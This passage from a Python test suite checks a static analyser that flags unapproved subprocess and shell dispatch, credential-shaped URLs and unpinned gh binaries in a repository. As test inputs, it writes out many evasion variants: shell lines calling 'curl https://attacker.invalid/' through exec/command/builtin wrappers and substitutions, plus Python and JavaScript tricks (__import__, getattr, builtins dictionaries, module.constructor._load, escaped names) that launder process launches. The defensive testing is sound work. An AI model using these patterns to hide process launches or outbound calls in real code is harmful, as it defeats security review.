        return failures + [f"unparsed_source:{exc.lineno}"]
    parents: dict[ast.AST, ast.AST] = {}
    for parent in ast.walk(tree):
        for child in ast.iter_child_nodes(parent):
            parents[child] = parent
    bindings = _python_local_constants(tree, parents, path)
    (
        subprocess_modules, os_modules, asyncio_modules, importlib_modules, builtins_modules,
        pty_modules, multiprocessing_modules, sys_modules, import_calls, import_module_calls,
        imported_process_calls,
    ) = _python_process_bindings(tree)
    bounded_launcher_aliases = _python_bounded_launcher_aliases(tree)
    for node in ast.walk(tree):
        if isinstance(node, ast.Attribute) and isinstance(node.value, ast.Name) and node.value.id == "sys" and node.attr == "executable":
            # Documentation may name the rejected contract; executable code may not depend on it.
            if not isinstance(parents.get(node), ast.JoinedStr):
                failures.append(f"sys.executable:{node.lineno}")
        if not isinstance(node, ast.Call):
            continue
        scope = parents.get(node)
        while scope is not None and not isinstance(scope, (ast.Module, ast.FunctionDef, ast.AsyncFunctionDef, ast.Lambda)):
            scope = parents.get(scope)
        module_sets = (subprocess_modules, os_modules, asyncio_modules, importlib_modules, builtins_modules,
                       pty_modules, multiprocessing_modules, sys_modules, import_calls)
        if scope is not None and _python_dynamic_sink(node, scope, bindings, module_sets, import_module_calls):
            failures.append(f"dynamic_code:{node.lineno}")
            continue
        callable_provenance = _resolved_python_process_callable(
            node.func, scope, bindings,
            (subprocess_modules, os_modules, asyncio_modules, importlib_modules, builtins_modules,
             pty_modules, multiprocessing_modules, sys_modules, import_calls),
            import_module_calls, imported_process_calls,
        ) if scope is not None else None
        module, name = callable_provenance or ("", "")
        if module == "multiprocessing" and name == "Process":
            target = next((keyword.value for keyword in node.keywords if keyword.arg == "target"), None)
            if target is None:
                failures.append(f"ambiguous_dispatch:{node.lineno}:process_target")
            else:
                target_provenance = _resolved_python_process_callable(
                    target, scope, bindings,
                    (subprocess_modules, os_modules, asyncio_modules, importlib_modules, builtins_modules,
                     pty_modules, multiprocessing_modules, sys_modules, import_calls),
                    import_module_calls, imported_process_calls,
                ) if scope is not None else None
                if target_provenance is None or target_provenance[1] is None:
                    failures.append(f"ambiguous_dispatch:{node.lineno}:process_target")
                else:
                    failures.append(f"callable_dispatch:{node.lineno}:{target_provenance[0]}.{target_provenance[1]}")
            continue
        if isinstance(node.func, ast.Name) and node.func.id in bounded_launcher_aliases:
            module, name = "subprocess", "Popen"
        if callable_provenance is not None and name is None:
            failures.append(f"ambiguous_dispatch:{node.lineno}")
            continue
        if module == "<dynamic>" and name in (
            SUBPROCESS_CALLS | SUBPROCESS_SHELL_CALLS | OS_EXEC_CALLS | OS_SPAWN_CALLS
            | OS_SHELL_CALLS | ASYNCIO_EXEC_CALLS | ASYNCIO_SHELL_CALLS
        ):
            failures.append(f"ambiguous_dispatch:{node.lineno}")
            continue
        recognized = (
            module == "subprocess" and name in SUBPROCESS_CALLS | SUBPROCESS_SHELL_CALLS
            or module == "os" and name in OS_EXEC_CALLS | OS_SPAWN_CALLS | OS_SHELL_CALLS
            or module == "asyncio" and name in ASYNCIO_EXEC_CALLS | ASYNCIO_SHELL_CALLS
            or module == "pty" and name in PTY_SPAWN_CALLS
        )
        if not recognized:
            continue
        if (
            module == "os" and name in OS_SHELL_CALLS
            or module == "subprocess" and name in SUBPROCESS_SHELL_CALLS
            or module == "asyncio" and name in ASYNCIO_SHELL_CALLS
        ):
            failures.append(f"ambiguous_dispatch:{node.lineno}:shell_api")
            continue
        shell_keyword = next((keyword for keyword in node.keywords if keyword.arg == "shell"), None)
        shell = shell_keyword.value if shell_keyword else None
        if isinstance(shell, ast.Constant) and shell.value is True:
            failures.append(f"ambiguous_dispatch:{node.lineno}:shell_true")
        elif shell_keyword is not None and not (isinstance(shell, ast.Constant) and shell.value is False):
            failures.append(f"ambiguous_dispatch:{node.lineno}:shell")
        approved_provenance = (
            _is_existing_parameterized_launcher(path, node, parents)
            or isinstance(node.func, ast.Name) and node.func.id in bounded_launcher_aliases
            and _is_exact_bounded_forwarder(path, node, parents)
        )
        env_keyword = next((keyword for keyword in node.keywords if keyword.arg == "env"), None)
        if env_keyword is not None and not _approved_env_expression(
            path, env_keyword.value, node, tree, parents, approved_provenance,
        ):
            failures.append(f"ambiguous_dispatch:{node.lineno}:env_override")
        override = next((keyword.value for keyword in node.keywords if keyword.arg == "executable"), None)
        argument_index = 1 if module == "os" and name in OS_SPAWN_CALLS - {"posix_spawn", "posix_spawnp"} else 0
        unpacked_keywords = any(keyword.arg is None for keyword in node.keywords)
        keyword_argv = next(
            (keyword.value for keyword in node.keywords if keyword.arg == "args"), None
        ) if module == "subprocess" else None
        if override is not None:
            argv = override
        elif unpacked_keywords:
            failures.append(f"ambiguous_dispatch:{node.lineno}")
            continue
        elif keyword_argv is not None:
            argv = keyword_argv
        elif len(node.args) <= argument_index:
            failures.append(f"ambiguous_dispatch:{node.lineno}")
            continue
        else:
            argv = node.args[argument_index]
        scope = parents.get(node)
        while scope is not None and not isinstance(scope, (ast.Module, ast.FunctionDef, ast.AsyncFunctionDef, ast.Lambda)):
            scope = parents.get(scope)
        value = _resolved_python_head(argv, scope, bindings) if scope is not None else None
        if value is None and approved_provenance:
            continue
        if value in {None, "<ambiguous>"}:
            failures.append(f"ambiguous_dispatch:{node.lineno}")
        elif value is not None and (
            module == "pty" and value != "/<validated-child>"
            or _is_ambient_process_head(value)
        ):
            failures.append(f"bare_dispatch:{node.lineno}:{value}")
    return failures


def test_untracked_rebuildable_cache_is_not_a_production_dispatch_surface():
    cache_dir = ROOT / "scripts" / "__pycache__"
    probe = cache_dir / "untracked-dispatch-probe.pyc"
    cache_dir.mkdir(exist_ok=True)
    probe.write_bytes(b"not bytecode")
    try:
        assert probe not in tracked_runtime_sources()
        assert probe not in discovered_dispatch_consumers()
    finally:
        probe.unlink(missing_ok=True)
        try:
            cache_dir.rmdir()
        except OSError:
            pass


def test_complete_dispatch_surface_is_installed_and_closed_by_the_manifest():
    installed = installed_sources()
    consumers = discovered_dispatch_consumers()
    assert not discovered_shell_failures(), "\n".join(discovered_shell_failures())
    assert consumers, "dispatch derivation became vacuous"
    assert len(consumers) >= 15, consumers
    assert not (consumers - installed), "production dispatch consumers absent from manifest: " + ", ".join(
        str(path.relative_to(ROOT)) for path in sorted(consumers - installed)
    )


def test_installed_production_has_no_direct_ambient_dispatch_contract():
    failures = []
    for path in sorted(installed_sources()):
        failures.extend(f"{path.relative_to(ROOT)}:{item}" for item in direct_dispatch_violations(path))
    assert not failures, "\n".join(failures)


def test_installed_production_has_no_credential_shaped_https_examples():
    pattern = re.compile(r"https://[^/\s:]+:(?:gh[a-zA-Z]*_|github_pat_)")
    findings = []
    for path in sorted(installed_sources()):
        for line_number, line in enumerate(path.read_text().splitlines(), 1):
            if pattern.search(line):
                findings.append(f"{path.relative_to(ROOT)}:{line_number}")
    assert not findings, "credential-shaped examples trigger secret scanners: " + ", ".join(findings)


def test_repository_has_no_raw_x_access_token_url_prefix():
    needle = "https://" + "x-access-token:"
    findings = []
    for path in sorted(ROOT.rglob("*")):
        if not path.is_file() or ".git" in path.parts:
            continue
        try:
            lines = path.read_text().splitlines()
        except UnicodeDecodeError:
            continue
        findings.extend(f"{path.relative_to(ROOT)}:{line_number}" for line_number, line in enumerate(lines, 1) if needle in line)
    assert not findings, "raw credential URI prefixes trigger secret scanners: " + ", ".join(findings)


def test_credential_bearing_gh_consumers_carry_the_frozen_validator():
    consumers = []
    for path in sorted(installed_sources()):
        text = path.read_text(errors="replace")
        dispatches_gh = bool(re.search(r'(?:trusted_executable_path\(["\']gh["\']\)|\[["\']gh["\']|GH_SOURCE=)', text))
        if not dispatches_gh or not any(key in text for key in ("GH_TOKEN", "GITHUB_TOKEN", "GH_ENTERPRISE_TOKEN")):
            continue
        consumers.append(path)
        if path.suffix == ".sh":
            assert "frozen_exec" in text and 'GH_SOURCE="/usr/local/bin/gh"' in text, path
        else:
            assert "TRUSTED_EXECUTABLE_DIGESTS" in text and "trusted_executable_path" in text, path
            assert '"gh": Path("/usr/local/bin/gh")' in text, path
    assert len(consumers) >= 4, "credential-bearing gh dispatch derivation became vacuous"


def test_a_real_injected_dispatch_regression_is_detected_not_a_diagnostic_array():
    path = ROOT / "scripts" / "hermes-busdriver-smoke"
    source = path.read_text()
    injected = source + '\nsubprocess.Popen(["git", "status"])\n'
    assert any(item.startswith("bare_dispatch:") for item in direct_dispatch_violations(path, injected))
    diagnostic = source + '\nexample = {"cmd": ["git", "status"]}\n'
    assert not [item for item in direct_dispatch_violations(path, diagnostic) if item.startswith("bare_dispatch:")]


def test_required_checks_shell_dispatch_is_fully_enumerated():
    path = ROOT / "scripts" / "check-required-checks.sh"
    assert shell_external_dispatches(path) == REQUIRED_CHECKS_SHELL_DISPATCHES


def test_shell_positional_command_heads_require_exact_installed_source():
    installed = ROOT / "scripts" / "check-required-checks.sh"
    source = installed.read_text()
    assert hashlib.sha256(source.encode()).hexdigest() == POSITIONAL_WRAPPER_SHA256
    assert not ({"$@", "${@}", "$*", "${*}"} & shell_external_dispatches(installed))
    synthetic = ROOT / "scripts" / "probe.sh"
    for positional in ("$@", "${@}", "$*", "${*}"):
        candidate = f'#!/bin/bash\nforward() {{ "{positional}"; }}\nforward "$@"\n'
        assert positional in shell_external_dispatches(synthetic, candidate), positional
    mutated = source + '\nextra_forward() { "$@"; }\n'
    assert "$@" in shell_external_dispatches(installed, mutated)
    assert "shell_dispatch:$@" in direct_dispatch_violations(installed, mutated)


def test_shell_awk_is_allowed_only_in_the_exact_installed_positional_wrapper():
    installed = ROOT / "scripts" / "check-required-checks.sh"
    source = installed.read_text()
    assert hashlib.sha256(source.encode()).hexdigest() == POSITIONAL_WRAPPER_SHA256
    assert "shell_dispatch:/usr/bin/awk" not in direct_dispatch_violations(installed, source)
    injected = source + '\nawk \'BEGIN { system("curl") }\'\n'
    assert "shell_dispatch:awk" in direct_dispatch_violations(installed, injected)


def test_a_real_injected_shell_dispatch_regression_is_detected():
    path = ROOT / "scripts" / "check-required-checks.sh"
    source = path.read_text()
    mutations = {
        "bare": "curl https://attacker.invalid/",
        "assignment": "GH_TOKEN=x curl https://attacker.invalid/",
        "substitution": "x=$(curl https://attacker.invalid/)",
        "wrapper": "credential_free_exec curl https://attacker.invalid/",
        "command": "command curl https://attacker.invalid/",
        "command_io_redirect": "command 2>/dev/null curl https://attacker.invalid/",
        "command_end_options": "command -- curl https://attacker.invalid/",
        "builtin": "builtin curl https://attacker.invalid/",
        "builtin_io_redirect": "builtin 2>/dev/null curl https://attacker.invalid/",
        "exec": "exec curl https://attacker.invalid/",
        "exec_argv0": "exec -a name curl https://attacker.invalid/",
        "exec_argv0_io_redirect": "exec -a name 2>/dev/null curl https://attacker.invalid/",
        "exec_assignment_argv0": "exec -a A=B curl https://attacker.invalid/",
        "pipeline_group_subshell": "( true ) | { curl https://attacker.invalid/; }",
        "absolute": "/usr/bin/curl https://attacker.invalid/",
    }
    for name, mutation in mutations.items():
        failures = direct_dispatch_violations(path, source + "\n" + mutation + "\n")
        expected = "/usr/bin/curl" if name == "absolute" else "curl"
        assert f"shell_dispatch:{expected}" in failures, (name, failures)
    separated_io_number = direct_dispatch_violations(
        path, source + "\ncommand 2 >/dev/null curl https://attacker.invalid/\n"
    )
    assert "shell_dispatch:2" in separated_io_number, separated_io_number
    assert "shell_dispatch:curl" not in separated_io_number, separated_io_number
    eval_failures = direct_dispatch_violations(path, source + "\neval 'curl https://attacker.invalid/'\n")
    assert any(
        item.startswith("unparsed_shell:ambiguous_shell_dispatch:") and item.endswith(":eval")
        for item in eval_failures
    ), eval_failures
    diagnostic = path.read_text() + '\necho "diagnostic: /usr/bin/curl is forbidden"\n'
    assert "shell_dispatch:/usr/bin/curl" not in direct_dispatch_violations(path, diagnostic)


def test_shell_reserved_prefixes_preserve_the_real_command_position():
    path = ROOT / "scripts" / "check-required-checks.sh"
    source = path.read_text()
    mutations = {
        "bang": "! curl https://attacker.invalid/",
        "bang_time": "! time curl https://attacker.invalid/",
        "time_portable": "time -p curl https://attacker.invalid/",
        "time_bang_forward_redirect": "time -p ! command 2>/dev/null curl $(printf arg)",
        "bang_time_exec_process": "! time exec curl <(printf arg)",
    }
    for name, mutation in mutations.items():
        candidate = source + "\n" + mutation + "\n"
        assert shell_syntax_failure(path, candidate) is None, name
        failures = direct_dispatch_violations(path, candidate)
        assert "shell_dispatch:curl" in failures, (name, failures)

    for malformed in ("time -x", "time -p", "! time"):
        failures = direct_dispatch_violations(path, source + "\n" + malformed + "\n")
        assert any(item.startswith("unparsed_shell:ambiguous_shell_dispatch:") for item in failures), failures

    for forwarded_reserved in ("command time curl", "exec ! curl", "credential_free_exec time curl"):
        failures = direct_dispatch_violations(path, source + "\n" + forwarded_reserved + "\n")
        expected = "!" if "!" in forwarded_reserved else "time"
        assert f"shell_dispatch:{expected}" in failures, (forwarded_reserved, failures)
        assert "shell_dispatch:curl" not in failures, (forwarded_reserved, failures)


def test_nested_shell_comments_cannot_desynchronize_substitution_parsing():
    path = ROOT / "scripts" / "check-required-checks.sh"
    source = path.read_text()
    mutations = {
        "command": "(\nVAR=$( # (\n) curl https://attacker.invalid/\n)",
        "process": "printf x <( # (((\ncurl https://attacker.invalid/\n)",
        "legacy": "x=`# \\` and ((\ncurl https://attacker.invalid/`",
        "arithmetic_nested": "echo $(( $( # (((\ncurl https://attacker.invalid/\n) + 1 ))",
    }
    for name, mutation in mutations.items():
        candidate = source + "\n" + mutation + "\n"
        assert shell_syntax_failure(path, candidate) is None, name
        failures = direct_dispatch_violations(path, candidate)
        assert "shell_dispatch:curl" in failures, (name, failures)

    controls = ("echo hash#not_comment", "echo '# ('", 'echo "# ("')
    for control in controls:
        candidate = source + "\n" + control + "\n"
        assert shell_syntax_failure(path, candidate) is None, control
        assert "shell_dispatch:curl" not in direct_dispatch_violations(path, candidate)


def test_python_indirect_dispatch_resolves_only_conservative_local_constants():
    path = ROOT / "probe.py"
    mutations = {
        "list": 'cmd = ["git", "status"]\nsubprocess.Popen(cmd)\n',
        "list_alias": 'cmd = ["git", "status"]\nalias = cmd\nsubprocess.Popen(alias)\n',
        "shell_string": 'subprocess.Popen("bash -c true", shell=True)\n',
        "env_string_alias": 'cmd = "/usr/bin/env python3 -V"\nalias = cmd\nsubprocess.Popen(alias, shell=True)\n',
    }
    for name, source in mutations.items():
        failures = direct_dispatch_violations(path, source)
        assert any(item.startswith("bare_dispatch:") for item in failures), (name, failures)

    unsafe_parameter = "def unsafe(argv):\n    subprocess.Popen(argv)\n"
    diagnostic = 'example = {"cmd": ["git", "status"]}\n'
    assert any(item.startswith("ambiguous_dispatch:") for item in direct_dispatch_violations(path, unsafe_parameter))
    assert not direct_dispatch_violations(path, diagnostic)


def test_python_direct_process_apis_and_actual_heads_fail_closed():
    path = ROOT / "probe.py"
    mutations = {
        "run": 'import subprocess\nsubprocess.run(["git", "status"])\n',
        "popen_override": 'import subprocess\nsubprocess.Popen(["/usr/bin/printf", "x"], executable="git")\n',
        "system": 'import os\nos.system("git status")\n',
        "execvp": 'import os\nos.execvp("git", ["git", "status"])\n',
        "ambient_curl": 'import subprocess\nsubprocess.call(["curl", "--version"])\n',
        "ambient_custom": 'import subprocess\nsubprocess.check_call(["custom-tool"])\n',
        "ambient_relative": 'import subprocess\nsubprocess.check_output(["./tool"])\n',
        "arbitrary_absolute": 'import subprocess\nsubprocess.run(["/digest/validated/tool"])\n',
        "shell_true": 'import subprocess\nsubprocess.run(command, shell=True)\n',
        "import_alias": 'from subprocess import run as process_run\nprocess_run(["git", "status"])\n',
        "os_alias": 'import os as operating_system\noperating_system.spawnvp(0, "git", ["git", "status"])\n',
    }
    for name, source in mutations.items():
        assert direct_dispatch_violations(path, source), (name, source)

    controls = (
        'def run(argv):\n    return argv\nrun(["git", "status"])\n',
        'example = {"cmd": ["curl", "--version"]}\n',
    )
    for source in controls:
        assert not direct_dispatch_violations(path, source), source


def test_python_standard_process_aliases_and_exec_variants_cannot_bypass_dispatch_checks():
    path = ROOT / "probe.py"
    mutations = {
        **{
            api: f'import os\nos.{api}("git", "git", "status")\n'
            for api in ("execl", "execle", "execlp", "execlpe")
        },
        **{
            api: f'import os\nos.{api}("git", ["git", "status"])\n'
            for api in ("execv", "execve", "execvp", "execvpe")
        },
        "arbitrary_absolute_exec": 'import os\nos.execl("/digest/validated/tool", "tool")\n',
        "getoutput": 'import subprocess\nsubprocess.getoutput("git status")\n',
        "getstatusoutput": 'from subprocess import getstatusoutput as capture\ncapture(command)\n',
        "async_exec": 'import asyncio\nasyncio.create_subprocess_exec("git", "status")\n',
        "async_shell": 'import asyncio as aio\naio.create_subprocess_shell(command)\n',
        "async_import_alias": (
            'from asyncio import create_subprocess_exec as launch\nlaunch("git", "status")\n'
        ),
        "module_assignment_alias": 'import subprocess\nsp = subprocess\nsp.run(["git", "status"])\n',
        "module_assignment_chain": 'import asyncio\na = asyncio\nb = a\nb.create_subprocess_exec("git")\n',
    }
    for name, source in mutations.items():
        failures = direct_dispatch_violations(path, source)
        assert failures, (name, source)
        if name in {"getoutput", "getstatusoutput", "async_shell"}:
            assert any(item.endswith(":shell_api") for item in failures), (name, failures)

    controls = ('import subprocess\nsp = factory()\nsp.run(["git", "status"])\n',)
    for source in controls:
        assert not direct_dispatch_violations(path, source), source


def test_python_process_function_objects_and_computed_members_fail_closed():
    path = ROOT / "probe.py"
    mutations = {
        "function_chain": 'import subprocess\nlaunch = subprocess.Popen\nagain = launch\nagain(["git"])\n',
        "imported_chain": 'from subprocess import run as launch\nagain = launch\nagain(["git"])\n',
        "os_function": 'import os as operating\nlaunch = operating.execvp\nlaunch("git", ["git"])\n',
        "async_function": 'import asyncio\nlaunch = asyncio.create_subprocess_exec\nlaunch("git")\n',
        "getattr_static": 'import subprocess\ngetattr(subprocess, "Popen")(["git"])\n',
        "dict_static": 'import subprocess\nsubprocess.__dict__["Popen"](["git"])\n',
        "getattr_dynamic": 'import subprocess\ngetattr(subprocess, api)(argv)\n',
        "dict_dynamic": 'import subprocess\nsubprocess.__dict__[api](argv)\n',
    }
    for name, source in mutations.items():
        failures = direct_dispatch_violations(path, source)
        assert failures, (name, source)
        if "dynamic" in name:
            assert any(item.startswith("ambiguous_dispatch:") for item in failures), (name, failures)

    controls = (
        'import unrelated\nlaunch = unrelated.Popen\nlaunch(["git"])\n',
        'class Diagnostic:\n    __dict__ = {"Popen": lambda value: value}\nDiagnostic.__dict__["Popen"](["git"])\n',
        'example = {"Popen": ["git"]}\n',
    )
    for source in controls:
        assert not direct_dispatch_violations(path, source), source


def test_python_constant_computed_module_constructors_and_aliases_cannot_bypass_checks():
    path = ROOT / "probe.py"
    mutations = {
        "dunder_import": 'sp = __import__("subprocess")\nsp.run(["curl"])\n',
        "dunder_import_alias_chain": (
            'sp = __import__("subprocess")\nlaunch = sp.Popen\nagain = launch\nagain(["curl"])\n'
        ),
        "importlib": (
            'import importlib\nsp = importlib.import_module("subprocess")\nsp.run(["curl"])\n'
        ),
        "importlib_function_alias": (
            'from importlib import import_module as load\n'
            'aio = load("asyncio")\nlaunch = aio.create_subprocess_exec\nlaunch("curl")\n'
        ),
        "computed_os": '__import__("os").execvp("curl", ["curl"])\n',
        "dynamic_module": '__import__(module_name).run(argv)\n',
        "dynamic_importlib_module": (
            'import importlib\nimportlib.import_module(module_name).Popen(argv)\n'
        ),
    }
    for name, source in mutations.items():
        failures = direct_dispatch_violations(path, source)
        assert failures, (name, source)
        if name.startswith("dynamic"):
            assert any(item.startswith("ambiguous_dispatch:") for item in failures), (name, failures)


def test_python_standard_loader_aliases_getattr_and_dynamic_values_fail_closed():
    path = ROOT / "probe.py"
    positives = {
        "from_builtins": 'from builtins import __import__ as load\nload("subprocess").run(["curl"])\n',
        "dunder_alias_chain": 'load = __import__\nagain = load\nsp = again("subprocess")\nsp.run(["curl"])\n',
        "builtins_import_alias": 'import builtins as b\nloader = b.__import__\nloader("subprocess").run(["curl"])\n',
        "builtins": 'import builtins\nbuiltins.__import__("os").system("curl")\n',
        "builtins_object_alias": 'import builtins\nb = builtins\nload = b.__import__\nload("asyncio").create_subprocess_exec("curl")\n',
        "constant_getattr": 'import builtins\nload = getattr(builtins, "__import__")\nload("subprocess").Popen(["curl"])\n',
        "aliased_getattr": 'import builtins\nga = getattr\nload = ga(builtins, "__import__")\nload("subprocess").run(["curl"])\n',
        "builtins_getattr_alias": 'import builtins\nga = builtins.getattr\nload = ga(builtins, "__import__")\nload("subprocess").run(["curl"])\n',
        "importlib_getattr": 'import importlib\nload = getattr(importlib, "import_module")\nload("os").execvp("curl", ["curl"])\n',
        "dunder_builtins_attr": '__builtins__.__import__("subprocess").run(["curl"])\n',
        "dunder_builtins_dict": '__builtins__["__import__"]("os").system("curl")\n',
        "dunder_builtins_alias": 'built = __builtins__\nload = getattr(built, "__import__")\nload("subprocess").run(["curl"])\n',
    }
    for name, source in positives.items():
        assert direct_dispatch_violations(path, source), (name, source)
    dynamic = (
        'load = __import__\nload(module_name).run(argv)\n',
        'import builtins\ngetattr(builtins, loader_api)("subprocess").run(argv)\n',
        'import importlib\ngetattr(importlib, loader_api)(module_name).Popen(argv)\n',
        '__builtins__[loader_api](module_name).run(argv)\n',
    )
    for source in dynamic:
        failures = direct_dispatch_violations(path, source)
        assert any(item.startswith("ambiguous_dispatch:") for item in failures), (source, failures)
    for source in (
        'load = __import__\ndata = load("json")\ndata.dumps({"cmd": "curl"})\n',
        'def load(name): return object()\nload("child_process").diagnose("curl")\n',
        'def getattr(owner, name): return lambda module: object()\nload = getattr(local, "__import__")\nload("subprocess").run(["curl"])\n',
    ):
        assert direct_dispatch_violations(path, source) == [], source


def test_javascript_indirect_dispatch_resolves_literal_alias_chains():
    path = ROOT / "probe.ts"
    source = 'const tool = "git";\nconst alias = tool;\nexecFileSync(alias, ["status"]);\n'
    failures = direct_dispatch_violations(path, source)
    assert any(item.endswith(":git") for item in failures), failures
    assert direct_dispatch_violations(
        path, 'const tool = process.env.BD_BROKER_PYTHON;\nexecFileSync(tool, ["broker.py"]);\n'
    )


def test_python_builtins_dictionary_loader_provenance_is_closed():
    path = ROOT / "probe.py"
    positives = (
        'import builtins\nload = builtins.__dict__["__import__"]\nprocess = load("subprocess")\nprocess.run(["git", "status"])\n',
        'import builtins as b\nmodule = b\nload = vars(module)["__import__"]\nload("os").system("git status")\n',
        'import builtins\nload = builtins.__dict__.get("__import__")\nload("asyncio").create_subprocess_exec("git")\n',
        'import builtins\nload = getattr(vars(builtins), "get")("__import__")\nload("subprocess").Popen(["git"])\n',
    )
    for source in positives:
        assert direct_dispatch_violations(path, source), source
    dynamic = 'import builtins\nload = builtins.__dict__[member]\nload(module).run(argv)\n'
    assert any(item.startswith("ambiguous_dispatch:") for item in direct_dispatch_violations(path, dynamic))
    controls = (
        'registry = {"__import__": lambda name: object()}\nregistry["__import__"]("subprocess")\n',
        'class Loader:\n    __dict__ = {"__import__": lambda name: object()}\nLoader.__dict__["__import__"]("subprocess")\n',
    )
    for source in controls:
        assert direct_dispatch_violations(path, source) == [], source


def test_python_argv_in_place_head_mutations_invalidate_stale_constants():
    path = ROOT / "probe.py"
    mutations = (
        'import subprocess\ncmd = ["/usr/bin/python3"]\ncmd[0] = "curl"\nsubprocess.run(cmd)\n',
        'import subprocess\ncmd = ["/usr/bin/python3"]\ncmd.clear()\ncmd.append("curl")\nsubprocess.run(cmd)\n',
        'import subprocess\ncmd = ["/usr/bin/python3", "curl"]\ndel cmd[0]\nsubprocess.run(cmd)\n',
        'import subprocess\ncmd = ["/usr/bin/python3"]\ncmd.__setitem__(0, "curl")\nsubprocess.run(cmd)\n',
        'import subprocess\ncmd = ["/usr/bin/python3"]\n*cmd, = ["curl"]\nsubprocess.run(cmd)\n',
        'import subprocess\ncmd = ["/usr/bin/python3"]\nalias = cmd\nalias.clear()\nalias.append("curl")\nsubprocess.run(cmd)\n',
        'import subprocess\ncmd = ["/usr/bin/python3"]\nalias = cmd\nalias[0] = "curl"\nsubprocess.run(cmd)\n',
        'import subprocess\ncmd = ["/usr/bin/python3"]\nalias = cmd\ndel alias[0]\nalias += ["curl"]\nsubprocess.run(cmd)\n',
        'import subprocess\ncmd = alias = ["/usr/bin/python3"]\nalias[0] = "curl"\nsubprocess.run(cmd)\n',
    )
    for source in mutations:
        failures = direct_dispatch_violations(path, source)
        assert any(item.startswith("ambiguous_dispatch:") for item in failures), failures
    preserved = 'import subprocess\ncmd = ["/usr/bin/python3"]\ncmd += ["worker.py"]\nsubprocess.run(cmd)\n'
    assert direct_dispatch_violations(path, preserved) == []


def test_python_nested_alias_outer_callable_and_shadowed_loader_do_not_fail_open():
    path = ROOT / "probe.py"
    exploits = (
        (
            'import subprocess\ncmd = ["/usr/bin/python3"]\n'
            'def mutate(value):\n    value[0] = "curl"\n'
            'mutate(cmd)\nsubprocess.run(cmd)\n'
        ),
        (
            'import subprocess\ncmd = ["/usr/bin/python3"]\nalias = cmd\n'
            'def mutate(value):\n    value.clear()\n    value.append("curl")\n'
            'mutate(alias)\nsubprocess.run(cmd)\n'
        ),
        (
            'import subprocess\ncmd = ["/usr/bin/python3"]\n'
            'def outer(value):\n'
            '    def inner(target):\n        target[0] = "curl"\n'
            '    inner(value)\n'
            'outer(cmd)\nsubprocess.run(cmd)\n'
        ),
        (
            'import subprocess\ncmd = ["/usr/bin/python3"]\n'
            'def poison(*items):\n    items[0][0] = "curl"\n'
            'poison(*[cmd])\nsubprocess.run(cmd)\n'
        ),
        (
            'import subprocess\ncmd = ["/usr/bin/python3"]\n'
            'def poison(*items):\n    items[0][0] = "curl"\n'
            'poison(*(cmd,))\nsubprocess.run(cmd)\n'
        ),
        (
            'import subprocess\ncmd = ["/usr/bin/python3"]\n'
            'def poison(**items):\n    items["argv"][0] = "curl"\n'
            'poison(**{"argv": cmd})\nsubprocess.run(cmd)\n'
        ),
        (
            'import subprocess\ncmd = ["/usr/bin/python3"]\n'
            'class Helper:\n    def mutate(self, value):\n        value[0] = "curl"\n'
            'helper = Helper()\nhelper.mutate(cmd)\nsubprocess.run(cmd)\n'
        ),
        (
            'import subprocess\ncmd = []\ncmd.extend(["curl"])\nsubprocess.run(cmd)\n'
        ),
        (
            'import subprocess\ncmd = []\ncmd += ["curl"]\nsubprocess.run(cmd)\n'
        ),
        (
            'import subprocess\nrunner = subprocess.Popen\n'
            'def dispatch(cmd):\n    runner(cmd)\n'
            'dispatch(["curl"])\n'
        ),
        (
            'import subprocess\ndef getattr(owner, name):\n    return subprocess.Popen\n'
            'local = object()\ngetattr(local, "Popen")(["curl"])\n'
        ),
    )
    for source in exploits:
        failures = direct_dispatch_violations(path, source)
        assert failures, source


def test_python_process_keyword_argument_shapes_do_not_fail_open():
    path = ROOT / "probe.py"
    sources = (
        'import subprocess\nsubprocess.Popen(args=["curl"])\n',
        'import subprocess\nsubprocess.run(args=["curl"])\n',
        'import subprocess\nkwargs = {"args": ["curl"]}\nsubprocess.Popen(**kwargs)\n',
        'import subprocess\nsubprocess.Popen(**{"args": ["curl"]})\n',
    )
    for source in sources:
        failures = direct_dispatch_violations(path, source)
        assert failures, source
    assert direct_dispatch_violations(
        path, 'import subprocess\nsubprocess.run(args=["/usr/bin/git", "status"])\n'
    ) == []


def test_javascript_local_object_properties_cannot_launder_process_callables():
    path = ROOT / "probe.ts"
    sources = (
        'const relay = { spawn: require("node:child_process").spawn };\nrelay.spawn("curl", []);',
        'const relay = { get spawn(){ return require("node:child_process").spawn } };\nrelay.spawn("curl", []);',
        'const { spawn } = require("node:child_process");\nconst relay = { spawn };\nrelay.spawn("curl", []);',
        'const run = require("node:child_process").spawn;\nconst relay = { spawn: run };\nrelay.spawn("curl", []);',
        'const cp = require("node:child_process");\nconst relay = { run: cp.spawn };\nrelay.run("curl", []);',
        'const relay = { get run(){ return require("node:child_process").spawn } };\nrelay.run("curl", []);',
        'const cp = require("node:child_process");\nconst relay = { ["run"]: cp.spawn };\nrelay["run"]("curl", []);',
    )
    for source in sources:
        failures = direct_dispatch_violations(path, source)
        assert any(item.endswith(":curl") or item.startswith("ambiguous_dispatch:") for item in failures), source
    controls = (
        'const relay = { spawn(){ return "local"; } };\nrelay.spawn("curl", []);',
        'const spawn = () => "local";\nconst relay = { spawn };\nrelay.spawn("curl", []);',
    )
    for source in controls:
        assert direct_dispatch_violations(path, source) == [], source


def test_javascript_array_literals_cannot_launder_process_callables():
    path = ROOT / "probe.ts"
    sources = (
        'const cp = require("node:child_process");\nconst relay = [cp.spawn];\nrelay[0]("curl", []);',
        'const run = require("node:child_process").spawn;\nconst relay = [run];\nrelay[0]("curl", []);',
        'const cp = require("node:child_process");\nconst [run] = [cp.spawn];\nrun("curl", []);',
    )
    for source in sources:
        failures = direct_dispatch_violations(path, source)
        assert failures, source
    control = 'const run = () => "local";\nconst relay = [run];\nrelay[0]("curl", []);'
    assert direct_dispatch_violations(path, control) == []


def test_javascript_module_constructor_load_is_treated_as_a_loader():
    path = ROOT / "probe.ts"
    sources = (
        'module.constructor._load("child_process").spawn("curl", []);',
        'const load = module.constructor._load;\nload("node:child_process").execFileSync("curl");',
        '(module.constructor._load)("child_process").spawnSync("curl", []);',
        'module.constructor["_load"]("child_process").spawn("curl", []);',
        'module["constructor"]._load("child_process").spawnSync("curl", []);',
        'const load = module["constructor"]["_load"];\nload("node:child_process").execFileSync("curl");',
        'const { spawnSync: mySpawn } = module[`constructor`][`_load`](`child_process`);\nmySpawn(`curl`, []);',
        r'''const load = module[`constr\u0075ctor`][`_\u006coad`];
const relay = { [`r\u0075n`]: load(`child_\u0070rocess`)[`sp\u0061wn`] };
relay.run(`curl`, []);''',
        r'''const load = module[`constr\u{75}ctor`][`_\x6coad`];
